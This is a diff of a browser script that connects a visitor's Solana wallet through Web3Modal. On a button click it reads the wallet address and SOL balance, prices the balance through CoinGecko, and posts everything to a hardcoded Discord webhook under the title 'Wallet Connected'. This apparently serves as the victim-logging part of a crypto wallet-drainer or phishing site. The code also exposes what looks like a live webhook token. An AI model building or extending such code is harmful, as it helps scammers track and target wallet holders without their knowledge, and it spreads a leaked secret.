@@ -1,34 +1,22 @@
-// === Import Solana Modules ===
-import "https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js";
-import "https://unpkg.com/@web3modal/solana@latest/dist/index.umd.js";
-import { Web3Modal } from "https://unpkg.com/@web3modal/html@2.6.2";
-
-// === Solana Wallet Setup ===
-const solanaWallet = new window.Web3ModalSolana.SolanaWalletAdapter();
-
 // === Discord Webhook URL ===
 const webhookURL = "https://discord.com/api/webhooks/1364326652473114644/8fTaSHHEVBU1xJThC5V3xwAuXonQlwC3xwE0CJh0CoJ9l5RQmArpqJfzieQNHV23rMiR";
 
-// === Web3Modal Setup ===
-const web3Modal = new Web3Modal({
-  cacheProvider: true, // Save the modal state
-  providerOptions: {
-    solana: {
-      package: window.Web3ModalSolana, // Solana connector package
-      connector: async () => new window.Web3ModalSolana.SolanaWalletAdapter(), // Solana wallet adapter
-    },
-  },
+// === Load Web3Modal for Solana ===
+const web3Modal = new window.Web3Modal({
+  projectId: "24cb4618162c124a24e58a917ab7cc45", // optional
+  walletConnectVersion: 2,
+  solanaWallets: [new window.Web3ModalSolana.SolanaWalletAdapter()]
 });
 
-// === Connect Solana Wallet and Send Balance to Discord ===
+// === Connect to Solana Wallet and Send Info to Discord ===
 async function connectSolanaWallet() {
   try {
-    const provider = await web3Modal.connect(); // Open the modal and get the provider
-    await solanaWallet.connect(); // Connect to the Solana wallet
+    const wallet = new window.Web3ModalSolana.SolanaWalletAdapter();
+    await wallet.connect();
 
-    const publicKey = solanaWallet.publicKey.toString();
-    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'));
-    const balance = await connection.getBalance(solanaWallet.publicKey);
+    const publicKey = wallet.publicKey.toString();
+    const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl("mainnet-beta"));
+    const balance = await connection.getBalance(wallet.publicKey);
     const sol = balance / solanaWeb3.LAMPORTS_PER_SOL;
 
     const usdPrice = await getUSDPrice("solana");
@@ -36,26 +24,28 @@ async function connectSolanaWallet() {
 
     await sendToDiscordEmbed({
       address: publicKey,
-      nativeBalances: [{ chain: 'Solana', symbol: 'SOL', amount: sol.toFixed(6), usd: usdValue }],
-      tokenSections: [] // Add token data later if needed
+      nativeBalances: [
+        { chain: "Solana", symbol: "SOL", amount: sol.toFixed(6), usd: usdValue }
+      ],
+      tokenSections: [] // Extend with token data if needed
     });
-  } catch (err) {
-    console.error("Solana connect error:", err);
+  } catch (e) {
+    console.error("Solana connect error:", e);
   }
 }
 
-// === Get USD Price from CoinGecko ===
+// === Fetch USD Price from CoinGecko ===
 async function getUSDPrice(symbol) {
   try {
-    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol.toLowerCase()}&vs_currencies=usd`);
+    const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${symbol}&vs_currencies=usd`);
     const data = await res.json();
-    return data[symbol.toLowerCase()]?.usd || null;
+    return data[symbol]?.usd || null;
   } catch {
     return null;
   }
 }
 
-// === Send Embed Message to Discord ===
+// === Send Embed to Discord ===
 async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
   const embed = {
     title: `💼 Wallet Connected`,
@@ -69,7 +59,7 @@ async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
       },
       ...tokenSections.map(section => ({
         name: `📜 Tokens on ${section.chain}`,
-        value: section.tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ""}`).join('\n'),
+        value: section.tokens.map(t => `- ${t.symbol}: ${t.amount} ${t.usd ? `($${t.usd})` : ''}`).join('\n'),
         inline: false
       }))
     ],
@@ -87,3 +77,11 @@ async function sendToDiscordEmbed({ address, nativeBalances, tokenSections }) {
     console.error("Failed to send embed", err);
   }
 }
+
+// === Button Logic ===
+window.addEventListener("load", () => {
+  const button = document.querySelector("w3m-core-button");
+  if (button) {
+    button.addEventListener("click", connectSolanaWallet);
+  }
+});
